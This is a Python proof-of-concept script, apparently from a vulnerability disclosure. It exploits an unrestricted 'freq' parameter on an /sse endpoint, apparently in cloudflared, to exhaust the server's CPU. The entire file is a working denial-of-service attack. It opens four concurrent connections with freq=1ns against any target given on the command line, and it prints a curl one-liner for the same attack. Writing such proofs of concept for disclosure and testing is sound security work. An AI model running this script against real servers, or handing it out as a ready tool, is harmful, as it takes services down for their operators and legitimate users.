#!/usr/bin/env python3
"""
PoC: Unrestricted SSE Frequency — CPU Exhaustion

Demonstrates that the /sse endpoint accepts a user-controlled `freq` parameter
with no minimum threshold. Setting freq=1ns causes the server to enter a
tight loop writing events continuously, saturating CPU.

Usage:
    python3 poc_sse.py http://localhost:8080

Impact: Each connection with freq=1ns consumes ~100% of one CPU core.
Multiple connections multiply the effect, starving the server.
"""

import sys
import socket
import time
import threading
from urllib.parse import urlparse

NUM_CONNECTIONS = 4  # 4 connections = 4 CPU cores saturated

def sse_connection(host, port, conn_id):
    """Open an SSE connection with freq=1ns and count received events."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        request = (
            f"GET /sse?freq=1ns HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Accept: text/event-stream\r\n"
            f"\r\n"
        )
        sock.sendall(request.encode())
        sock.settimeout(1)

        total_bytes = 0
        start = time.time()

        while time.time() - start < 10:  # Read for 10 seconds
            try:
                data = sock.recv(65536)
                if not data:
                    break
                total_bytes += len(data)
            except socket.timeout:
                continue

        elapsed = time.time() - start
        rate_mb = (total_bytes / (1024 * 1024)) / elapsed if elapsed > 0 else 0
        print(f"[*] Connection {conn_id}: received {total_bytes:,} bytes in {elapsed:.1f}s ({rate_mb:.1f} MB/s)")
        sock.close()
    except Exception as e:
        print(f"[!] Connection {conn_id} error: {e}")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:8080")
        sys.exit(1)

    url = urlparse(sys.argv[1])
    host = url.hostname or "localhost"
    port = url.port or 80

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Opening {NUM_CONNECTIONS} SSE connections with freq=1ns")
    print(f"[*] Monitor CPU: top -p $(pgrep cloudflared)")
    print()

    # Quick demo: single curl command
    print("[*] Quick manual test:")
    print(f"    curl -N 'http://{host}:{port}/sse?freq=1ns'")
    print(f"    (watch CPU spike to 100% on one core)")
    print()

    # Launch concurrent connections
    threads = []
    for i in range(NUM_CONNECTIONS):
        t = threading.Thread(target=sse_connection, args=(host, port, i + 1))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print()
    print(f"[*] Done. With {NUM_CONNECTIONS} connections at freq=1ns:")
    print(f"    - cloudflared CPU should have been at ~{NUM_CONNECTIONS * 100}%")
    print(f"    - Legitimate requests would have been starved")

if __name__ == "__main__":
    main()
